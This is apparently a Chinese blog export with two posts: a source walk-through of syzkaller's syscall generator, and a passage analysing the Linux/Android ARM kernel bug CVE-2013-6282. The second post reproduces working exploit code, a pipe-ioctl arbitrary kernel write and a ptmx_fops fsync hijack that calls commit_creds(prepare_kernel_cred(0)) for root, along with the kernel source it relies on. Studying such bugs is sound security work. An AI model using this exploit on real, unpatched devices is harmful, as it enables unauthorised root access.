[{"title":"syzkaller_source_read_generate_system_calls","url":"/posts/uncategorized/2018-05-14-syzkaller_source_read_generate_system_calls.html","content":"\n\n# ** 本文摘要—— {{ title }} ** <Excerpt in index | 首页:摘要>\n<!-- more -->\n\n<The rest of contents | 余下全文>\n\n## syzkaller源码阅读之生成系统调用\n\n### 生成系统调用的核心方法——Target类型中的Generate方法(prog/generation.go中定义)\n\n前面说过Prog类型是个很重要的类型,它包含了目标体系结构Target类型和相关的系统调用切片数组,这里生成系统调用主要是通过随机类型生成一个新的Prog类型变量并返回.\n\nGenerate方法调用generateCall生成一个系统调用对应的参数等信息\n\n```go\nfunc (target *Target) Generate(rs rand.Source, ncalls int, ct *ChoiceTable) *Prog {\n\t//建立一个Prog类型对象\n\tp := &Prog{\n\t\tTarget: target,\n\t}\n\t//初始化随机类型\n\tr := newRand(target, rs)\n\ts := newState(target, ct)\n\tfor len(p.Calls) < ncalls {\n\t\t//随机生成一个系统调用  参数类型和值(参数类型就比较多了具体看prog/rand.go中的generateArgImpl实现)\n\t\tcalls := r.generateCall(s, p)\n\t\tfor _, c := range calls {\n\t\t\t//分析系统调用对应的参数类型并进行相关的设置(如资源类型添加到对应的资源map中)\n\t\t\t//具体实现在prog/analysis.go中(func (s *state) analyzeImpl(c *Call, resources bool))实现\n\t\t\ts.analyze(c)\n\t\t\t//把生成的系统调用添加到prog中\n\t\t\tp.Calls = append(p.Calls, c)\n\t\t}\n\t}\n\tif debug {\n\t\tif err := p.validate(); err != nil {\n\t\t\tpanic(err)\n\t\t}\n\t}\n\treturn p\n}\n```\n\n\n### 随机生成一个系统调用和该系统调用对应的参数(prog/rand.go中定义)\n\n随机生成一个系统调用是通过随机类型实现:随机类型包含了一个Target类型的对象,通过自身的随机函数,可以生成Target中的系统调用切片数组元素即生成一个个的系统调用\n\n随机生成一个系统调用的详细步骤:\n1、随机生成一个系统调用号\n2、生成该系统调用对应的参数\ngenerateCall负责随机生成一个系统调用号,然后通过generateParticularCall生成一个具体的系统调用Call类型\n\n\n```go\nfunc (r *randGen) generateCall(s *state, p *Prog) []*Call {\n\tidx := 0\n\tif s.ct == nil {\n\t\t//随机生成一个系统调用号\n\t\tidx = r.Intn(len(r.target.Syscalls))\n\t} else {\n\t\tcall := -1\n\t\tif len(p.Calls) != 0 {//如果目标系统enabled的系统调用切片数组存在不为空\n\t\t\tcall = p.Calls[r.Intn(len(p.Calls))].Meta.ID//随机获取一个系统调用号\n\t\t}\n\t\tidx = s.ct.Choose(r.Rand, call)\n\t}\n\t//通过系统调用号生成一个系统调用 meta是生成的系统调用描述\n\tmeta := r.target.Syscalls[idx]\n\treturn r.generateParticularCall(s, meta)\n}\n```\n\n### 随机生成系统调用Call类型(prog/rand.go中定义)\n\ngenerateParticularCall函数根据具体的系统调用描述(Syscall类型)生成相应的系统调用Call类型和具体的参数值,其中meta是随机生成的系统调用描述且该系统调用为enabled\n\n通过generateArgs为该系统调用生成相关的参数值\n\n```go\nfunc (r *randGen) generateParticularCall(s *state, meta *Syscall) (calls []*Call) {\n\t//通过系统调用生成一个Call类型 Call类型是一个完整的系统调用包含参数和返回值\n\tc := &Call{\n\t\tMeta: meta,\n\t\tRet:  MakeReturnArg(meta.Ret),//生成返回值类型\n\t}\n\t//生成系统调用的参数\n\tc.Args, calls = r.generateArgs(s, meta.Args)\n\tr.target.assignSizesCall(c)\n\tcalls = append(calls, c)\n\tfor _, c1 := range calls {\n\t\tr.target.SanitizeCall(c1)\n\t}\n\treturn calls\n}\n```\n\n\n### 为随机生成的系统调用生成相关的所有参数值(prog/rand.go中定义)\n\n为系统调用生成该系统调用的所有参数值,循环遍历系统调用参数类型切片数组,按参数类型生成具体的参数值\n\n```go\nfunc (r *randGen) generateArgs(s *state, types []Type) ([]Arg, []*Call) {\n\tvar calls []*Call\n\t//args定义参数类型的切片数组\n\targs := make([]Arg, len(types))\n\n\t// Generate all args. Size args have the default value 0 for now.\n\t//生成所有的参数类型 size默认大小是0\n\t//遍历参数类型切片数组\n\tfor i, typ := range types {\n\t\t//按第i个参数的类型生成参数的值\n\t\targ, calls1 := r.generateArg(s, typ)\n\t\tif arg == nil {\n\t\t\tpanic(fmt.Sprintf(\"generated arg is nil for type '%v', types: %+v\", typ.Name(), types))\n\t\t}\n\t\targs[i] = arg\n\t\tcalls = append(calls, calls1...)\n\t}\n\n\treturn args, calls\n}\n\n```\n\n### 为系统调用生成一个具体的参数值(prog/rand.go中定义)\n\n通过传入参数的类型,为参数生成一个具体的值,其中参数types是系统调用的参数类型切片数组\n其中有如下几种参数类型Const类型(包括IntType——int、FlagsType——标记、ConstType——常量、ProcType——处理器相关、VmaType——虚拟内存vma类型、ResourceType——资源类型)\n指针类型(StructType——结构体指针、ArrayType——数组指针、UnionType——枚举联合类型的指针),其中指针设计多级指针的问题默认不超过3级指针超过设置为空指针\n资源类型(ResourceType——资源类型)包含三种生成方式:已经存在的资源类型、创建一个新的资源类型、生成一个特殊的值\n缓冲区类型(BufferType)包括:BufferBlobRand(随机的blog缓冲区)、BufferBlobRange(随机范围的blob缓冲区)、BufferString(字符串)、BufferFilename(文件名相关的缓冲区)、BufferText(文本相关的缓冲区)\n虚拟内存类型(VmaType)创建一个虚拟内存\n标记类型(FlagsType)内核中一些用来作flag标记的参数\n常量类型(ConstType)\n整型(IntType)\n处理器相关的类型(ProcType)\n数组类型(ArrayType)\n结构体类型(StructType)\n联合枚举类型(UnionType)\n指针类型(PtrType)\n长度类型(LenType)\n自定义类型(CsumType)\n其中针对不同的类型通过MakeXXXXArg生成参数对应类型的值,比如对于指针类型其生成值的函数为MakePointerArg,\n结构体类型和数组类型通过MakeGroupArg生成,结构体类型看成是不同元素类型的数组\n相关生成函数MakeXXXXArg在prog/rand.go中定义\n\n```go\n\n\n//按参数类型生成参数的值\n//typ 参数类型\nfunc (r *randGen) generateArg(s *state, typ Type) (arg Arg, calls []*Call) {\n\treturn r.generateArgImpl(s, typ, false)\n}\n\n\n//具体生成参数类型的实现函数\n//参数类型可能是buffer、struct、union、指针等类型所以这里实现比较长\n//typ参数类型\nfunc (r *randGen) generateArgImpl(s *state, typ Type, ignoreSpecial bool) (arg Arg, calls []*Call) {\n\t//参数模式  输出参数\n\tif typ.Dir() == DirOut {\n\t\t// No need to generate something interesting for output scalar arguments.\n\t\t// But we still need to generate the argument itself so that it can be referenced\n\t\t// in subsequent calls. For the same reason we do generate pointer/array/struct\n\t\t// output arguments (their elements can be referenced in subsequent calls).\n\t\tswitch typ.(type) {\n\t\t//判断参数的类型\n\t\t//int flags const Proc类型 vma类型 Resource类型 生成一个默认的值\n\t\tcase *IntType, *FlagsType, *ConstType, *ProcType,\n\t\t\t*VmaType, *ResourceType:\n\t\t\t//生成一个默认的值\n\t\t\treturn r.target.defaultArg(typ), nil\n\t\t}\n\t}\n\n\tif typ.Optional() && r.oneOf(5) {\n\t\t//为typ类型成成一个默认值\n\t\treturn r.target.defaultArg(typ), nil\n\t}\n\n\t// Allow infinite recursion for optional pointers.\n\t//允许任意指针的无限递归\n\t//如果是指针类型\n\tif pt, ok := typ.(*PtrType); ok && typ.Optional() {\n\t\tswitch pt.Type.(type) {\n\t\t//判断指针类型\n\t\t//指针是指向结构体、数组、union联合类型\n\t\tcase *StructType, *ArrayType, *UnionType:\n\t\t\tname := pt.Type.Name()\n\t\t\tr.recDepth[name]++\n\t\t\tdefer func() {\n\t\t\t\tr.recDepth[name]--\n\t\t\t\tif r.recDepth[name] == 0 {\n\t\t\t\t\tdelete(r.recDepth, name)\n\t\t\t\t}\n\t\t\t}()\n\t\t\t//如果指针层数太多 默认值为空指针\n\t\t\tif r.recDepth[name] >= 3 {\n\t\t\t\t//为空指针生成一个默认值\n\t\t\t\treturn MakeNullPointerArg(typ), nil\n\t\t\t}\n\t\t}\n\t}\n\n\t//判断类型\n\tswitch a := typ.(type) {\n\t//Resource类型\n\tcase *ResourceType:\n\t\tswitch {\n\t\t//概率\n\t\tcase r.nOutOf(1000, 1011):\n\t\t\t// Get an existing resource.\n\t\t\t//已经存在的resource\n\t\t\tvar allres []Arg\n\t\t\tfor name1, res1 := range s.resources {\n\t\t\t\tif name1 == \"iocbptr\" {\n\t\t\t\t\tcontinue\n\t\t\t\t}\n\t\t\t\tif r.target.isCompatibleResource(a.Desc.Name, name1) ||\n\t\t\t\t\tr.oneOf(20) && r.target.isCompatibleResource(a.Desc.Kind[0], name1) {\n\t\t\t\t\tallres = append(allres, res1...)\n\t\t\t\t}\n\t\t\t}\n\t\t\tif len(allres) != 0 {\n\t\t\t\t//生成Resource类型的默认值\n\t\t\t\targ = MakeResultArg(a, allres[r.Intn(len(allres))], 0)\n\t\t\t} else {\n\t\t\t\targ, calls = r.createResource(s, a)\n\t\t\t}\n\t\t//概率\t\n\t\tcase r.nOutOf(10, 11):\n\t\t\t// Create a new resource.\n\t\t\t//创建一个新的资源\n\t\t\targ, calls = r.createResource(s, a)\n\t\tdefault:\n\t\t\t//生成一个特殊的值为Resource类型\n\t\t\tspecial := a.SpecialValues()\n\t\t\targ = MakeResultArg(a, nil, special[r.Intn(len(special))])\n\t\t}\n\t\treturn arg, calls\n\tcase *BufferType:\n\t\t//buffer类型\n\t\tswitch a.Kind {\n\t\tcase BufferBlobRand, BufferBlobRange:\n\t\t\t//BufferBlobRand, BufferBlobRange类型的buffer\n\t\t\tsz := r.randBufLen()\n\t\t\tif a.Kind == BufferBlobRange {\n\t\t\t\tsz = r.randRange(a.RangeBegin, a.RangeEnd)\n\t\t\t}\n\t\t\tif a.Dir() == DirOut {//输出参数\n\t\t\t\t//为buffer类型且为输出参数的类型生成默认值\n\t\t\t\treturn MakeOutDataArg(a, sz), nil\n\t\t\t}\n\t\t\tdata := make([]byte, sz)\n\t\t\tfor i := range data {\n\t\t\t\tdata[i] = byte(r.Intn(256))\n\t\t\t}\n\t\t\t//buffer类型非输出参数 生成默认的值\n\t\t\treturn MakeDataArg(a, data), nil\n\t\tcase BufferString:\n\t\t\t//bufferstring类型的buffer\n\t\t\tdata := r.randString(s, a)\n\t\t\tif a.Dir() == DirOut {//输出参数\n\t\t\t\t//为其生成默认值\n\t\t\t\treturn MakeOutDataArg(a, uint64(len(data))), nil\n\t\t\t}\n\t\t\t//非输出参数生成默认值\n\t\t\treturn MakeDataArg(a, data), nil\n\t\tcase BufferFilename:\n\t\t\t//bufferfilename类型的buffer\n\t\t\tif a.Dir() == DirOut {\n\t\t\t\t//输出参数\n\t\t\t\tvar sz uint64\n\t\t\t\t//大小设置\n\t\t\t\tswitch {\n\t\t\t\tcase !a.Varlen():\n\t\t\t\t\tsz = a.Size()\n\t\t\t\tcase r.nOutOf(1, 3):\n\t\t\t\t\tsz = r.rand(100)\n\t\t\t\tcase r.nOutOf(1, 2):\n\t\t\t\t\tsz = 108 // UNIX_PATH_MAX\n\t\t\t\tdefault:\n\t\t\t\t\tsz = 4096 // PATH_MAX\n\t\t\t\t}\n\t\t\t\t//为其生成参数类型\n\t\t\t\treturn MakeOutDataArg(a, sz), nil\n\t\t\t}\n\t\t\t//非输出参数设置默认值\n\t\t\treturn MakeDataArg(a, []byte(r.filename(s, a))), nil\n\t\tcase BufferText:\n\t\t\t//buffertext类型的buffer\n\t\t\tif a.Dir() == DirOut {\n\t\t\t\t//输出参数\n\t\t\t\treturn MakeOutDataArg(a, uint64(r.Intn(100))), nil\n\t\t\t}\n\t\t\t//非输出参数\n\t\t\treturn MakeDataArg(a, r.generateText(a.Text)), nil\n\t\tdefault:\n\t\t\tpanic(\"unknown buffer kind\")\n\t\t}\n\tcase *VmaType:\n\t\t//vma类型的参数\n\t\tnpages := r.randPageCount()\n\t\tif a.RangeBegin != 0 || a.RangeEnd != 0 {\n\t\t\t//获取vma范围 range范围\n\t\t\tnpages = a.RangeBegin + uint64(r.Intn(int(a.RangeEnd-a.RangeBegin+1)))\n\t\t}\n\t\t//根据vma范围分配一个vma\n\t\targ := r.allocVMA(s, a, npages)\n\t\treturn arg, nil\n\tcase *FlagsType:\n\t\t//flags类型的参数  就是内核中一些用来作flag标记的参数\n\t\treturn MakeConstArg(a, r.flags(a.Vals)), nil\n\tcase *ConstType:\n\t\t//const类型的参数\n\t\treturn MakeConstArg(a, a.Val), nil\n\tcase *IntType:\n\t\t//int类型的参数\n\t\tv := r.randInt()\n\t\tswitch a.Kind {\n\t\tcase IntFileoff:\n\t\t\tswitch {\n\t\t\tcase r.nOutOf(90, 101):\n\t\t\t\tv = 0\n\t\t\tcase r.nOutOf(10, 11):\n\t\t\t\tv = r.rand(100)\n\t\t\tdefault:\n\t\t\t\tv = r.randInt()\n\t\t\t}\n\t\tcase IntRange:\n\t\t\tv = r.randRangeInt(a.RangeBegin, a.RangeEnd)\n\t\t}\n\t\treturn MakeConstArg(a, v), nil\n\tcase *ProcType:\n\t\t//proc类型的参数\n\t\treturn MakeConstArg(a, r.rand(int(a.ValuesPerProc))), nil\n\tcase *ArrayType:\n\t\t//arrary数组类型的参数\n\t\tvar count uint64\n\t\tswitch a.Kind {\n\t\tcase ArrayRandLen:\n\t\t\tcount = r.randArrayLen()\n\t\tcase ArrayRangeLen:\n\t\t\tcount = r.randRange(a.RangeBegin, a.RangeEnd)\n\t\t}\n\t\tvar inner []Arg\n\t\tvar calls []*Call\n\t\tfor i := uint64(0); i < count; i++ {\n\t\t\targ1, calls1 := r.generateArg(s, a.Type)\n\t\t\tinner = append(inner, arg1)\n\t\t\tcalls = append(calls, calls1...)\n\t\t}\n\t\treturn MakeGroupArg(a, inner), calls\n\tcase *StructType:\n\t\t//struct结构体类型的参数\n\t\tif !ignoreSpecial {\n\t\t\tif gen := r.target.SpecialTypes[a.Name()]; gen != nil && a.Dir() != DirOut {//非输出参数\n\t\t\t\t//生成结构体类型值\n\t\t\t\targ, calls = gen(&Gen{r, s}, a, nil)\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n\t\targs, calls := r.generateArgs(s, a.Fields)\n\t\tgroup := MakeGroupArg(a, args)\n\t\treturn group, calls\n\tcase *UnionType:\n\t\t//联合union类型\n\t\tif !ignoreSpecial {\n\t\t\tif gen := r.target.SpecialTypes[a.Name()]; gen != nil && a.Dir() != DirOut {\n\t\t\t\targ, calls = gen(&Gen{r, s}, a, nil)\n\t\t\t\treturn\n\t\t\t}\n\t\t}\n\t\toptType := a.Fields[r.Intn(len(a.Fields))]\n\t\topt, calls := r.generateArg(s, optType)\n\t\treturn MakeUnionArg(a, opt), calls\n\tcase *PtrType:\n\t\t//指针类型\n\t\tinner, calls := r.generateArg(s, a.Type)\n\t\t// TODO(dvyukov): remove knowledge about iocb from prog.\n\t\tif a.Type.Name() == \"iocb\" && len(s.resources[\"iocbptr\"]) != 0 {\n\t\t\t// It is weird, but these are actually identified by kernel by address.\n\t\t\t// So try to reuse a previously used address.\n\t\t\taddrs := s.resources[\"iocbptr\"]\n\t\t\taddr := addrs[r.Intn(len(addrs))].(*PointerArg)\n\t\t\targ = MakePointerArg(a, addr.Address, inner)\n\t\t\treturn arg, calls\n\t\t}\n\t\targ := r.allocAddr(s, a, inner.Size(), inner)\n\t\treturn arg, calls\n\tcase *LenType:\n\t\t//len长度类型的参数\n\t\t// Return placeholder value of 0 while generating len arg.\n\t\treturn MakeConstArg(a, 0), nil\n\tcase *CsumType:\n\t\t//csum类型的参数\n\t\treturn MakeConstArg(a, 0), nil\n\tdefault:\n\t\tpanic(\"unknown argument type\")\n\t}\n}\n```\n\n\n### 随机生成系统调用总结\n\nsyzkaller使用两种方法来进行fuzz,基于生成和基于变异,本文是介绍基于生成fuzz相关的类型和核心处理函数\n由于随机类型randGen包含了目标体系结构描述Target,而目标体系结构描述包含系统调用等信息,所以可以通过\n随机类型随机生成目标系统中任意一个系统调用并给其参数生成一些值(按不同参数类型生成特定类型的值,这就是为什么定义系统调用描述时区分了系统调用参数类型数组和参数值数组见Call类型)\n这里和fuzz相关的一个类型是Prog,Prog类型包含了Target类型——目标系统相关的信息以及系统调用Call切片数组,\n通过随机类型生成一个Prog类型(包含了随机生成的一组系统调用及其其参数),然后去执行Prog类型生成的一组系统调用,进而实现fuzz\n\n\n","tags":["fuzzer"]},{"title":"CVE-2013-6282-analysis","url":"/posts/kernel/2018-05-02-cve_2013_6282_analysis.html","content":"\n# ** 本文摘要—— {{ title }} ** <Excerpt in index | 首页:摘要>\n<!-- more -->\n\n<The rest of contents | 余下全文>\n\n## CVE-2013-6282分析([相关系统调用查询](https://syscalls.kernelgrok.com/))\n\n### 用户空间和内核空间传递数据\n\n用户空间和内核空间传递数据一般是通过copy_to_user/copy_from_user或者put_user/get_user\n\n#### put_user(linux/include/asm-i386/uaccess.h)\n\nput_user向用户空间ptr写入一个简单的值x\n\n```c\nput_user(x,ptr)\nptr——用户空间的目的地址\nx——写入用户空间的值\n返回0表示成功,-EFAULT表示失败\n```\n\n#### get_user\n\nget_user从用户空间获取一个简单的变量\n\n```c\nget_user(x,ptr)\nptr——用户空间的源地址\nx——用来存储结果的变量\n返回0表示成功,-EFAULT表示失败\n```\n\n\n#### copy_to_user\n\ncopy_to_user拷贝一块数据到用户空间\n\n```c\nunsigned long copy_to_user (void __user * to, const void * from, unsigned long n);\nto——用户空间的目的地址\nfrom——内核空间的源地址\nn——拷贝的字节数\n```\n\n#### copy_from_user\n\ncopy_from_user从用户空间拷贝一块数据\n\n```c\nunsigned long copy_from_user (void * to, const void __user * from, unsigned long n);\nto——内核空间的目的地址\nfrom——用户空间的源地址\nn——拷贝的字节数\n```\n\n### 漏洞成因\n\nlinux3.5.5之前的内核对ARM平台上的get_user和put_user函数没有进行地址的检查,导致内核任意地址读写,导致LPE(本地权限提升)\n\n```go\nThe (1) get_user and (2) put_user API functions in \nthe Linux kernel before 3.5.5 on the v6k and v7 ARM platforms \ndo not validate certain addresses, which allows attackers to \nread or modify the contents of arbitrary kernel memory locations \nvia a crafted application, as exploited in the wild against \nAndroid devices in October and November 2013.\n```\n\n#### 通过put_user达到任意地址写(也可以通过ptrace调用put_user实现任意地址写)\n\n通过put_user达到任意地址写的思路——使用pipe(pipe会调用到put_user)\n1、建立一个管道\n2、向建立好的管道写入count个字节\n3、通过管道的ioctl调用put_user向指定的地址写count\n4、重复4次步骤2即可实现向任意地址写任意4字节\n\n\n[实现任意地址写](https://elixir.bootlin.com/linux/v2.6.35/source/fs/pipe.c#L654)\naddress——写入的地址\nvalue——写入的值\n\n把要写入的值如:0x12345678封装成一个char data[4]四字节的数组,分4次写入对应的地址\n*(int *)&data = value;\n向管道写入data[i]个字节(0x12个字节、0x34个字节、0x56个字节、0x78个字节)\nwrite(pfd[1], buf, data[i])\n通过pipe的FIONREAD调用put_user实现任意地址写\nioctl(pfd[0], FIONREAD, (void *)(address + i)\n\n```c\nhttps://elixir.bootlin.com/linux/v2.6.35/source/fs/pipe.c#L654\n\nstatic long pipe_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)\n{\n\tstruct inode *inode = filp->f_path.dentry->d_inode;\n\tstruct pipe_inode_info *pipe;\n\tint count, buf, nrbufs;\n\n\tswitch (cmd) {\n\t\tcase FIONREAD:\n\t\t\tmutex_lock(&inode->i_mutex);\n\t\t\tpipe = inode->i_pipe;\n\t\t\tcount = 0;\n\t\t\tbuf = pipe->curbuf;\n\t\t\tnrbufs = pipe->nrbufs;\n\t\t\twhile (--nrbufs >= 0) {\n\t\t\t    //可以发现count是pipe管道中写入的字节数\n\t\t\t\tcount += pipe->bufs[buf].len;\n\t\t\t\tbuf = (buf+1) & (pipe->buffers - 1);\n\t\t\t}\n\t\t\tmutex_unlock(&inode->i_mutex);\n            //由于参数arg是可控的且put_user没有进行地址的检查,这里控制为任意地址\n            //count为管道pipe中写入的字节数\n\t\t\treturn put_user(count, (int __user *)arg);\n\t\tdefault:\n\t\t\treturn -EINVAL;\n\t}\n}\n```\n\n#### [任意地址写exp](https://github.com/fi01/libput_user_exploit/blob/master/put_user.c)\n\n```c\nstatic bool pipe_write_value_at_address(unsigned long address, int value)\n{\n  char data[4];\n  int pfd[2];\n  int i;\n  *(int *)&data = value;\n\n  if (pipe(pfd) == -1) {\n    perror(\"pipe\");\n    return false;\n  }\n\n  //循环4次向address地址写入value\n  for (i = 0; i < sizeof (data); i++) \n  {\n    char buf[256];\n    buf[0] = 0;\n    if (data[i]) {\n      //向管道写入data[i]个字节此时count=data[i]\n      if (write(pfd[1], buf, data[i]) != data[i]) {\n      \tprintf(\"error in write().\\n\");\n\t\tbreak;\n      }\n    }\n    \n    //调用pipe_ioctl的FIONREAD——put_user实现任意地址写\n    //地址address+i写入一个字节,值为data[i]\n    //循环四次\n    if (ioctl(pfd[0], FIONREAD, (void *)(address + i)) == -1) {\n      perror(\"ioctl\");\n      break;\n    }\n\n    if (data[i]) {\n      //判断任意地址写是否成功\n      if (read(pfd[0], buf, sizeof buf) != data[i]) {\n\t\tprintf(\"error in read().\\n\");\n\t\tbreak;\n      }\n    }\n  }\n\n  close(pfd[0]);//read\n  close(pfd[1]);//write\n\n  return i == sizeof (data);\n}\n```\n\n#### [任意地址写的利用思路](https://github.com/timwr/CVE-2013-6282/blob/master/exploit.c)\n\n利用思路:\n1、获取ptmx_fops地址\n2、计算得到ptmx_fops_fsync地址\n3、用0xXXXXXXXX替换ptmx_fops_fsync即替换ptmx_fops->fsync指针\n4、在0xXXXXXXXX为函数地址(实现commit_creds(prepare_kernel_cred(0))),0xXXXXXXXX也可以是提前部署好的shellcode\n5、触发fsync调用(open(/dev/ptmx)触发)\n\n打开一个terminal,会在devpts文件系统/dev/pts下创建一个对应的pts字符文件,\n该pts字符文件节点直接由/dev/ptmx节点的驱动函数ptmx_open()\nptmx是一个file_operations只要找到ptmx的位置修改对应文件指针fsync即可截获控制流\n\n```c\n利用\nptmx_fops_fsync_address = ptmx_fops_address + 0x38;\n\n//修改ptmx_fops->fsync指针为obtain_root_privilege\noverwrite_ptmx_fsync_address(ptmx_fops_fsync_address, &obtain_root_privilege, run_obtain_root_privilege, NULL);\n\nbool overwrite_ptmx_fsync_address(unsigned long int address, void *value, bool (*exploit_callback)(void *user_data), void *user_data) {\n\tbool success;\n\t/*ptrace_write_value_at_address(address, value);*/\n\tpipe_write_value_at_address(address, value);\n\t//exploit_callback触发open(\"/dev/ptmx\") fsync调用\n\tsuccess = exploit_callback(user_data);\n\treturn success;\n}\n\n//提取\nvoid obtain_root_privilege(void) {\n\tcommit_creds(prepare_kernel_cred(0));\n}\n\n//触发fsync调用调用\nstatic bool run_obtain_root_privilege(void *user_data) {\n\tint fd;\n\tfd = open(PTMX_DEVICE, O_WRONLY);//\"/dev/ptmx\"\n\tfsync(fd);\n\tclose(fd);\n\treturn true;\n}\n```\n\n\n##### [ptmx_fops定义](https://elixir.bootlin.com/linux/v2.6.35/source/drivers/char/pty.c#L680)\n\nptmx_fops定义\n\n```c\nstatic struct file_operations ptmx_fops;\n```\n\nfile_operations定义(可以看出fsync在ptmx中的偏移)\n\n```c\n从file_operations定义中可以看到fsync偏移是多少\nhttps://elixir.bootlin.com/linux/v2.6.35/source/include/linux/fs.h#L1485\n/*\n * NOTE:\n * read, write, poll, fsync, readv, writev, unlocked_ioctl and compat_ioctl\n * can be called without the big kernel lock held in all filesystems.\n */\nstruct file_operations {\n\tstruct module *owner;\n\tloff_t (*llseek) (struct file *, loff_t, int);\n\tssize_t (*read) (struct file *, char __user *, size_t, loff_t *);\n\tssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);\n\tssize_t (*aio_read) (struct kiocb *, const struct iovec *, unsigned long, loff_t);\n\tssize_t (*aio_write) (struct kiocb *, const struct iovec *, unsigned long, loff_t);\n\tint (*readdir) (struct file *, void *, filldir_t);\n\tunsigned int (*poll) (struct file *, struct poll_table_struct *);\n\tint (*ioctl) (struct inode *, struct file *, unsigned int, unsigned long);\n\tlong (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);\n\tlong (*compat_ioctl) (struct file *, unsigned int, unsigned long);\n\tint (*mmap) (struct file *, struct vm_area_struct *);\n\tint (*open) (struct inode *, struct file *);\n\tint (*flush) (struct file *, fl_owner_t id);\n\tint (*release) (struct inode *, struct file *);\n\tint (*fsync) (struct file *, int datasync);//haijack函数指针\n\tint (*aio_fsync) (struct kiocb *, int datasync);\n\tint (*fasync) (int, struct file *, int);\n\tint (*lock) (struct file *, int, struct file_lock *);\n\tssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int);\n\tunsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long);\n\tint (*check_flags)(int);\n\tint (*flock) (struct file *, int, struct file_lock *);\n\tssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int);\n\tssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int);\n\tint (*setlease)(struct file *, long, struct file_lock **);\n};\n```\n\n[fsync系统调用](https://elixir.bootlin.com/linux/v2.6.35/source/fs/sync.c#L208)\n\nfsync===>do_fsync===>vfs_fsync===>vfs_fsync_range===>file->f_op->fsync(截获控制流)\n\n```c\nhttps://elixir.bootlin.com/linux/v2.6.35/source/fs/sync.c\n\nSYSCALL_DEFINE1(fsync, unsigned int, fd)\n{\n\treturn do_fsync(fd, 0);\n}\n\nstatic int do_fsync(unsigned int fd, int datasync)\n{\n\tstruct file *file;\n\tint ret = -EBADF;\n\n\tfile = fget(fd);\n\tif (file) {\n\t\tret = vfs_fsync(file, datasync);\n\t\tfput(file);\n\t}\n\treturn ret;\n}\n\n\nint vfs_fsync(struct file *file, int datasync)\n{\n\treturn vfs_fsync_range(file, 0, LLONG_MAX, datasync);\n}\n\n\nint vfs_fsync_range(struct file *file, loff_t start, loff_t end, int datasync)\n{\n\tstruct address_space *mapping = file->f_mapping;\n\tint err, ret;\n\n\tif (!file->f_op || !file->f_op->fsync) {\n\t\tret = -EINVAL;\n\t\tgoto out;\n\t}\n\n\tret = filemap_write_and_wait_range(mapping, start, end);\n\tmutex_lock(&mapping->host->i_mutex);\n\t//触发file_operation的fsync指针 实现haijack\n\terr = file->f_op->fsync(file, datasync);\n\tif (!ret)\n\t\tret = err;\n\tmutex_unlock(&mapping->host->i_mutex);\n\nout:\n\treturn ret;\n}\n```\n\n\n#### [通过get_user实现任意地址读](https://elixir.bootlin.com/linux/v2.6.35/source/net/tipc/socket.c#L1662)\n\n通过get_user达到任意地址读——建立socket,使用setsockopt实现任意地址读\n(这里是阅读的linux内核非android具体判断是不一样的——从exp中可以看出)\n1、建立一个socket\n2、调用setsockopt实现任意地址读——把任意地址的内容读取到value\n需要布置好lvl、ol参数的值绕过前面的判断,然后进入到res = get_user(value, (u32 __user *)ov),\n实现任意地址读——ov是可控地址\n3、调用getsockopt把value的值拷贝到用户空间\n\n\nsetsockopt实现任意地址读到value\n\n```c\nhttps://elixir.bootlin.com/linux/v2.6.35/source/net/tipc/socket.c#L1662\nstatic int setsockopt(struct socket *sock,\n\t\t      int lvl, int opt, char __user *ov, unsigned int ol)\n{\n\tstruct sock *sk = sock->sk;\n\tstruct tipc_port *tport = tipc_sk_port(sk);\n\tu32 value;\n\tint res;\n\n\tif ((lvl == IPPROTO_TCP) && (sock->type == SOCK_STREAM))\n\t\treturn 0;\n\tif (lvl != SOL_TIPC)\n\t\treturn -ENOPROTOOPT;\n\tif (ol < sizeof(value))\n\t\treturn -EINVAL;\n\t\t//ov是传入的地址可控\n\t\t//通过get_user实现任意地址读到value\n\tif ((res = get_user(value, (u32 __user *)ov)))\n\t\treturn res;\n\n\t...\n\t...\n\t...\n\n\trelease_sock(sk);\n\t\n\treturn res;\n}\n```\n\ngetsockopt把value的值拷贝到用户空间——通过copy_to_user函数实现\n\n```c\nhttps://elixir.bootlin.com/linux/v2.6.35/source/net/tipc/socket.c#L1721\n\nstatic int getsockopt(struct socket *sock,\n\t\t      int lvl, int opt, char __user *ov, int __user *ol)\n{\n\tstruct sock *sk = sock->sk;\n\tstruct tipc_port *tport = tipc_sk_port(sk);\n\tint len;\n\tu32 value;\n\tint res;\n\n\tif ((lvl == IPPROTO_TCP) && (sock->type == SOCK_STREAM))\n\t\treturn put_user(0, ol);\n\tif (lvl != SOL_TIPC)\n\t\treturn -ENOPROTOOPT;\n\tif ((res = get_user(len, ol)))\n\t\treturn res;\n\n\tlock_sock(sk);\n\n\tswitch (opt) {\n\tcase TIPC_IMPORTANCE:\n\t\tres = tipc_portimportance(tport->ref, &value);\n\t\tbreak;\n\tcase TIPC_SRC_DROPPABLE:\n\t\tres = tipc_portunreliable(tport->ref, &value);\n\t\tbreak;\n\tcase TIPC_DEST_DROPPABLE:\n\t\tres = tipc_portunreturnable(tport->ref, &value);\n\t\tbreak;\n\tcase TIPC_CONN_TIMEOUT:\n\t\tvalue = jiffies_to_msecs(sk->sk_rcvtimeo);\n\t\t/* no need to set \"res\", since already 0 at this point */\n\t\tbreak;\n\t case TIPC_NODE_RECVQ_DEPTH:\n\t\tvalue = (u32)atomic_read(&tipc_queue_size);\n\t\tbreak;\n\t case TIPC_SOCK_RECVQ_DEPTH:\n\t\tvalue = skb_queue_len(&sk->sk_receive_queue);\n\t\tbreak;\n\tdefault:\n\t\tres = -EINVAL;\n\t}\n\n\trelease_sock(sk);\n\n\tif (res) {\n\t\t/* \"get\" failed */\n\t}\n\telse if (len < sizeof(value)) {\n\t\tres = -EINVAL;\n\t}\n\t//拷贝到用户空间ov <- value\n \telse if (copy_to_user(ov, &value, sizeof(value))) {\n\t\tres = -EFAULT;\n\t}\n\telse {\n\t\tres = put_user(sizeof(value), ol);\n\t}\n\treturn res;\n}\n```\n\n相关宏参数定义\n\n```c\nhttps://elixir.bootlin.com/linux/v2.6.35/source/include/linux/socket.h#L275\n#define 